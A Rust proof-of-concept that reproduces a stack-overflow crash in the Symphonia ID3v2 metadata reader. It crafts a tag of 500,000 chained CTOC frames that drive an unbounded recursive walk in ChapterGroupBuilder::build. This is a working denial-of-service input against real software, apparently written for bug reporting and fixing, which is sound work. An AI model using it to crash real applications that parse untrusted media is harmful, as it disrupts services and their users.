//! Standalone reproduction for: unbounded recursion (stack overflow) in
//! `ChapterGroupBuilder::build`'s `dfs` helper (symphonia-metadata's ID3v2 reader).
//!
//! Unlike candidate 001 (nested CHAP/CTOC frames in the byte stream, guarded by a physical
//! nesting-depth limit added there), this builds a *flat* chain of 500,000 top-level `CTOC`
//! frames: toc_0 -> toc_1 -> toc_2 -> ... -> toc_{N-1}, each referencing exactly one child by
//! element ID. None of these frames are physically nested inside one another in the byte stream
//! (they are all read directly by the top-level frame loop in `read_id3v2_body`), so any guard
//! bounding physical frame-read recursion does not apply here. After the whole tag is parsed,
//! `ChapterGroupBuilder::build()` walks this reference graph with an unbounded recursive `dfs`
//! to assemble the final `ChapterGroup` tree, which recurses once per chain link.

use std::io::Cursor;

use symphonia_core::io::MediaSourceStream;
use symphonia_core::meta::{MetadataOptions, MetadataReader};
use symphonia_metadata::id3v2::Id3v2Reader;

fn ctoc_frame(id: &str, top_level: bool, child_id: Option<&str>) -> Vec<u8> {
    let mut body = Vec::new();
    body.extend_from_slice(id.as_bytes());
    body.push(0); // Null-terminate the element ID string.

    let mut flags = 0u8;
    if top_level {
        flags |= 0x02;
    }
    body.push(flags);

    match child_id {
        Some(child) => {
            body.push(1); // entry_count = 1
            body.extend_from_slice(child.as_bytes());
            body.push(0); // Null-terminate the item element ID string.
        }
        None => {
            body.push(0); // entry_count = 0
        }
    }

    let mut out = Vec::with_capacity(10 + body.len());
    out.extend_from_slice(b"CTOC");
    out.extend_from_slice(&(body.len() as u32).to_be_bytes()); // ID3v2.3 frame size: plain u32.
    out.extend_from_slice(&[0u8, 0u8]); // Frame flags.
    out.extend_from_slice(&body);
    out
}

fn build_malicious_id3v2_tag(n_levels: usize) -> Vec<u8> {
    let mut inner = Vec::new();

    for i in 0..n_levels {
        let id = i.to_string();
        let top_level = i == 0;
        let child_id = if i + 1 < n_levels { Some((i + 1).to_string()) } else { None };
        inner.extend_from_slice(&ctoc_frame(&id, top_level, child_id.as_deref()));
    }

    let mut out = Vec::new();
    out.extend_from_slice(b"ID3");
    out.push(3); // Major version.
    out.push(0); // Minor version.
    out.push(0); // Flags.

    let size = inner.len() as u32;
    // 28-bit syncsafe size (always syncsafe regardless of major version, per the ID3v2 spec).
    out.push(((size >> 21) & 0x7f) as u8);
    out.push(((size >> 14) & 0x7f) as u8);
    out.push(((size >> 7) & 0x7f) as u8);
    out.push((size & 0x7f) as u8);
    out.extend_from_slice(&inner);
    out
}

fn main() {
    let n_levels = std::env::var("N_LEVELS")
        .ok()
        .and_then(|s| s.parse::<usize>().ok())
        .unwrap_or(500_000);

    let data = build_malicious_id3v2_tag(n_levels);
    println!("crafted ID3v2 tag: {} bytes, {} chained CTOC frames", data.len(), n_levels);

    let mss = MediaSourceStream::new(Box::new(Cursor::new(data)), Default::default());

    let mut reader = Id3v2Reader::try_new(mss, MetadataOptions::default())
        .expect("failed to construct Id3v2Reader");

    match reader.read_all() {
        Ok(_) => println!("parsed OK (no crash)"),
        Err(e) => println!("parse error (no crash): {e}"),
    }
}
